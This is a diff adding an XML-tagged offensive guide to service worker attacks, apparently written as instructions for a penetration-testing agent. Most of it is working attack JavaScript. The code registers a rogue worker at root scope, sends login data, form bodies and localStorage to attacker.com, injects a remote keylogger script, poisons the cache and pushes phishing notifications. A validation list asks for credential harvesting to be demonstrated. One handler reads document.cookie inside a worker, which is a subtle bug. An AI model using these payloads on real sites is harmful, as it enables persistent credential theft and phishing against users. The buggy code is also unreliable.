@@ -1,0 +1,257 @@
+<vulnerability_guide>
+  <title>SERVICE WORKER ATTACKS</title>
+
+  <critical>Service Workers are powerful JavaScript workers that run in the background, intercepting all network requests for their scope. A compromised or malicious Service Worker can persist across sessions, intercept credentials, serve malicious content, and survive even after the vulnerability that installed it is patched.</critical>
+
+  <scope>
+    - Service Worker registration hijacking
+    - Persistent XSS through Service Workers
+    - Request/response interception
+    - Cache poisoning
+    - Push notification abuse
+    - Foreign fetch exploitation
+  </scope>
+
+  <methodology>
+    1. SERVICE WORKER ENUMERATION
+       {% raw %}
+       # Check for registered Service Workers
+       # In browser DevTools -> Application -> Service Workers
+
+       # JavaScript enumeration
+       navigator.serviceWorker.getRegistrations()
+         .then(registrations => {
+           registrations.forEach(reg => {
+             console.log('Scope:', reg.scope);
+             console.log('Script:', reg.active?.scriptURL);
+           });
+         });
+
+       # Check Registration Scope
+       # Scope determines what URLs the SW controls
+       # Default scope is directory of SW script
+       {% endraw %}
+
+    2. SERVICE WORKER REGISTRATION HIJACKING
+       {% raw %}
+       # If attacker can host JS at a path, can register SW
+       # Requirements:
+       # - Ability to serve JavaScript from same origin
+       # - Path with broader scope than existing SWs
+
+       # Attack vectors:
+       # - File upload vulnerability (upload malicious.js)
+       # - JSONP endpoints (return valid SW code)
+       # - Path traversal to serve attacker file
+
+       # Registration from XSS
+       if ('serviceWorker' in navigator) {
+         navigator.serviceWorker.register('/uploads/evil-sw.js', {
+           scope: '/'  // Control entire origin
+         });
+       }
+       {% endraw %}
+
+    3. PERSISTENT XSS VIA SERVICE WORKER
+       {% raw %}
+       # Once registered, SW persists until unregistered
+       # Even after original XSS is fixed
+
+       # Malicious Service Worker example
+       self.addEventListener('fetch', event => {
+         if (event.request.url.includes('/login')) {
+           // Intercept credentials
+           event.respondWith(
+             fetch(event.request.clone())
+               .then(response => {
+                 // Exfiltrate credentials
+                 fetch('https://attacker.com/log', {
+                   method: 'POST',
+                   body: JSON.stringify({
+                     url: event.request.url,
+                     cookies: document.cookie
+                   })
+                 });
+                 return response;
+               })
+           );
+         }
+       });
+       {% endraw %}
+
+    4. RESPONSE INTERCEPTION AND MODIFICATION
+       {% raw %}
+       # Service Worker can modify any response in scope
+
+       self.addEventListener('fetch', event => {
+         event.respondWith(
+           fetch(event.request).then(response => {
+             // Clone response to modify
+             return response.text().then(body => {
+               // Inject malicious script
+               const modified = body.replace(
+                 '</body>',
+                 '<script src="https://attacker.com/keylogger.js"></script></body>'
+               );
+               return new Response(modified, {
+                 headers: response.headers
+               });
+             });
+           })
+         );
+       });
+       {% endraw %}
+
+    5. CACHE POISONING
+       {% raw %}
+       # Abuse SW cache for persistent content injection
+
+       # Poison cache with malicious content
+       self.addEventListener('install', event => {
+         event.waitUntil(
+           caches.open('v1').then(cache => {
+             return cache.put(
+               '/important-page.html',
+               new Response('<html>Malicious content</html>', {
+                 headers: {'Content-Type': 'text/html'}
+               })
+             );
+           })
+         );
+       });
+
+       # Serve poisoned content
+       self.addEventListener('fetch', event => {
+         event.respondWith(
+           caches.match(event.request)
+             .then(response => response || fetch(event.request))
+         );
+       });
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <credential_harvesting>
+      {% raw %}
+      # Intercept form submissions
+      self.addEventListener('fetch', event => {
+        if (event.request.method === 'POST') {
+          event.request.clone().text().then(body => {
+            // Send credentials to attacker
+            fetch('https://attacker.com/harvest', {
+              method: 'POST',
+              body: body,
+              mode: 'no-cors'
+            });
+          });
+        }
+        event.respondWith(fetch(event.request));
+      });
+      {% endraw %}
+    </credential_harvesting>
+
+    <foreign_fetch>
+      {% raw %}
+      # Foreign fetch allowed SW to intercept cross-origin requests
+      # Deprecated but may exist in older apps
+
+      # Check for foreign-fetch header
+      Link: </sw.js>; rel="serviceworker"; scope="/"
+      Origin-Trial: <token>
+
+      # Impact: Could intercept third-party requests
+      {% endraw %}
+    </foreign_fetch>
+
+    <push_notification_abuse>
+      {% raw %}
+      # Service Workers can receive push notifications
+      # Even when page is closed
+
+      # Malicious push handler
+      self.addEventListener('push', event => {
+        // Execute code even when page not open
+        // Exfiltrate data, perform actions
+
+        event.waitUntil(
+          self.registration.showNotification('Update', {
+            body: 'Click to view',
+            data: {url: 'https://attacker.com/phish'}
+          })
+        );
+      });
+
+      self.addEventListener('notificationclick', event => {
+        // User clicks notification
+        clients.openWindow(event.notification.data.url);
+      });
+      {% endraw %}
+    </push_notification_abuse>
+
+    <sync_exploitation>
+      {% raw %}
+      # Background Sync allows deferred actions
+      # Can execute when connectivity returns
+
+      self.addEventListener('sync', event => {
+        if (event.tag === 'exfiltrate') {
+          event.waitUntil(
+            // Delayed exfiltration
+            fetch('https://attacker.com/delayed', {
+              method: 'POST',
+              body: localStorage.getItem('sensitive')
+            })
+          );
+        }
+      });
+
+      # Register sync from page
+      navigator.serviceWorker.ready.then(reg => {
+        reg.sync.register('exfiltrate');
+      });
+      {% endraw %}
+    </sync_exploitation>
+
+    <scope_manipulation>
+      {% raw %}
+      # SW scope is determined by:
+      # 1. Default: directory containing SW script
+      # 2. scope parameter in register()
+      # 3. Service-Worker-Allowed header (can expand scope)
+
+      # Scope expansion attack
+      # If server sends: Service-Worker-Allowed: /
+      # SW at /user/uploads/sw.js can control entire site
+
+      # Check for header
+      curl -I https://target.com/sw.js | grep -i service-worker
+      {% endraw %}
+    </scope_manipulation>
+  </advanced_techniques>
+
+  <detection>
+    - Audit registered Service Workers regularly
+    - Monitor Service-Worker-Allowed headers
+    - Check for unexpected SW registrations in logs
+    - Review CSP for worker-src directive
+    - Alert on SW registration from unusual paths
+  </detection>
+
+  <validation>
+    - Successfully register rogue Service Worker
+    - Intercept and log sensitive requests
+    - Demonstrate persistent XSS through SW
+    - Poison cache with malicious content
+    - Show credential harvesting capability
+  </validation>
+
+  <pro_tips>
+    - Service Workers require HTTPS (except localhost)
+    - SW persist until explicitly unregistered or browser clear
+    - Check /sw.js, /service-worker.js, /serviceworker.js common paths
+    - JSONP endpoints returning valid JS can be abused as SW scripts
+    - Clear-Site-Data header can remove SWs but must be sent over HTTPS
+  </pro_tips>
+
+  <remember>Service Workers are incredibly powerful - they're essentially a programmable proxy in the browser. A single registration vulnerability can turn into persistent compromise that survives page reloads, session clears, and even patching of the original vulnerability. Always check if file upload or JSONP vulnerabilities can be escalated to SW registration.</remember>
+</vulnerability_guide>
